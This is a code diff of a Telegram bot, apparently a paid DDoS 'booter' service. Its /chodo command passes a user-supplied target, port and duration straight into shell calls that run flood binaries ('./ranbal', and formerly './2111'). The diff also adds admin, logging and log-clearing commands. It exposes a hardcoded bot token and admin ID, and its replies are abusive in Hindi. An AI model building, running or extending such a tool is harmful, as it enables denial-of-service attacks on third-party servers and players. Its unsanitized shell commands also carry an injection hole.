@@ -4,9 +4,8 @@ import datetime
 import os
 from keep_alive import keep_alive
 keep_alive()
-
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7846072513:AAEnen_EhJwApi86j3t2Cw9E9cMXSfgjWGw-0rkeDPZfY')
+bot = telebot.TeleBot('7846072513:AAEnen_EhJwApi86j3t2Cw9E9cMXSfgjWGw')
 
 # Admin user IDs
 admin_id = {"7083378335"}
@@ -17,15 +16,28 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
-# Global variable to track if an attack is running
-attack_running = False
-
 def read_users():
     try:
         with open(USER_FILE, "r") as file:
             return file.read().splitlines()
     except FileNotFoundError:
         return []
+
+# Function to read free user IDs and their credits from the file
+def read_free_users():
+    try:
+        with open(FREE_USER_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                if line.strip():  # Check if line is not empty
+                    user_info = line.split()
+                    if len(user_info) == 2:
+                        user_id, credits = user_info
+                        free_user_credits[user_id] = int(credits)
+                    else:
+                        print(f"Ignoring invalid line in free user file: {line}")
+    except FileNotFoundError:
+        pass
 
 allowed_user_ids = read_users()
 
@@ -39,6 +51,35 @@ def log_command(user_id, target, port, time):
     
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+
+
+# Function to clear logs
+def clear_logs():
+    try:
+        with open(LOG_FILE, "r+") as file:
+            if file.read() == "":
+                response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
+            else:
+                file.truncate(0)
+                response = "log saaf ho gae "
+    except FileNotFoundError:
+        response = "Saaf karane ke lie koee Log nahin mila."
+    return response
+
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if time:
+        log_entry += f" | Time: {time}"
+    
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
+
+import datetime
 
 # Dictionary to store the approval expiry date for each user
 user_approval_expiry = {}
@@ -107,9 +148,130 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
     else:
-        response = "Mood ni hai abhi pelhe purchase kar isse:- @GTX_GHOST."
+        response = "Mood ni hai abhi pelhe purchase kar isse:- @TREXVIVEK."
 
     bot.reply_to(message , response)
+
+# Command handler for retrieving user info
+@bot.message_handler(commands=['myinfo'])
+def get_user_info(message):
+    user_id = str(message.chat.id)
+    user_info = bot.get_chat(user_id)
+    username = user_info.username if user_info.username else "N/A"
+    user_role = "Admin" if user_id in admin_id else "User"
+    remaining_time = get_remaining_approval_time(user_id)
+    response = f" Your Info:\n\n User ID: <code>{user_id}</code>\n Username: {username}\n Role: {user_role}\n Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n Remaining Approval Time: {remaining_time}"
+    bot.reply_to(message, response, parse_mode="HTML")
+
+
+
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for user_id in allowed_user_ids:
+                        file.write(f"{user_id}\n")
+                response = f"User {user_to_remove} removed successfully ."
+            else:
+                response = f"User {user_to_remove} not found in the list ."
+        else:
+            response = '''Please Specify A User ID to Remove. 
+ Usage: /remove <userid>'''
+    else:
+        response = "Purchase karle bsdk:- @TREXVIVEK ."
+
+    bot.reply_to(message, response)
+    
+@bot.message_handler(commands=['clearlogs'])
+def clear_logs_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(LOG_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
+                else:
+                    file.truncate(0)
+                    response = "log saaf ho gae "
+        except FileNotFoundError:
+            response = "Saaf karane ke lie koee Log nahin mila ."
+    else:
+        response = "BhenChod Owner na HAI TU LODE."
+    bot.reply_to(message, response)
+
+ 
+
+@bot.message_handler(commands=['allusers'])
+def show_all_users(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n"
+                    for user_id in user_ids:
+                        try:
+                            user_info = bot.get_chat(int(user_id))
+                            username = user_info.username
+                            response += f"- @{username} (ID: {user_id})\n"
+                        except Exception as e:
+                            response += f"- User ID: {user_id}\n"
+                else:
+                    response = "KOI DATA NHI HAI "
+        except FileNotFoundError:
+            response = "KOI DATA NHI HAI "
+    else:
+        response = "BhenChod Owner na HAI TU LODE."
+    bot.reply_to(message, response)
+
+
+@bot.message_handler(commands=['logs'])
+def show_recent_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
+            try:
+                with open(LOG_FILE, "rb") as file:
+                    bot.send_document(message.chat.id, file)
+            except FileNotFoundError:
+                response = "KOI DATA NHI HAI ."
+                bot.reply_to(message, response)
+        else:
+            response = "KOI DATA NHI HAI "
+            bot.reply_to(message, response)
+    else:
+        response = "BhenChod Owner na HAI TU LODE."
+        bot.reply_to(message, response)
+
+
+@bot.message_handler(commands=['id'])
+def show_user_id(message):
+    user_id = str(message.chat.id)
+    response = f"Your ID: {user_id}"
+    bot.reply_to(message, response)
+
+# Function to handle the reply when free users run the /attack
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    
+    response = f"CHUDAI start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahe Dalna Bhenchod"
+    bot.reply_to(message, response)
+
+    # Dictionary to store the last time each user ran the /chodo command
+bgmi_cooldown = {}
+
+COOLDOWN_TIME =0
+
+attack_running = False
 
 # Handler for /attack command
 @bot.message_handler(commands=['chodo'])
@@ -134,19 +296,13 @@ def handle_attack(message):
             else:
                 attack_running = True  # Set the attack state to running
                 try:
+                    record_command_logs(user_id, '/chodo', target, port, time)
                     log_command(user_id, target, port, time)
+                    start_attack_reply(message, target, port, time)
 
-                    # Run both commands side by side
-                    ranbal_command = f"./ranbal {target} {port} {time} 800"
-                    second_command = f"./2111 {target} {port} {time} 800"
-
-                    # Start both processes
-                    process1 = subprocess.Popen(ranbal_command, shell=True)
-                    process2 = subprocess.Popen(second_command, shell=True)
-
-                    # Wait for both to complete
-                    process1.wait()
-                    process2.wait()
+                    # Simulate attack process
+                    full_command = f"./ranbal {target} {port} {time} 900"
+                    subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
                 except Exception as e:
@@ -163,7 +319,6 @@ def handle_attack(message):
 
 
 
-        
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
@@ -293,4 +448,4 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
-        
+                                      
